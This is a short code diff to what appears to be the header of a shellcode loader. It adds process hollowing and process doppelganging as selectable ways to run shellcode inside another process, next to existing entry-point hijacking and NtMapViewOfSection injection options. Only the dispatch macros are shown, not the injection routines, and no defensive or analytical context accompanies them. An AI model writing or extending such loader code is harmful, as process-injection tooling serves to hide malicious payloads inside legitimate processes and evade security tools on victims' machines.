@@ -45,6 +45,10 @@
 #define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::HijackEntryPoint(phandle, shellcode, sizeof(shellcode))
 #elif CONFIG_EXECUTION_METHOD == 3
 #define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::InjectionNtMapViewOfSection(phandle, shellcode, sizeof(shellcode))
+#elif CONFIG_EXECUTION_METHOD == 4
+#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::Hollowing(phandle, shellcode, sizeof(shellcode))
+#elif CONFIG_EXECUTION_METHOD == 5
+#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::Doppleganger(phandle, shellcode, sizeof(shellcode))
 #endif
 
 #endif 
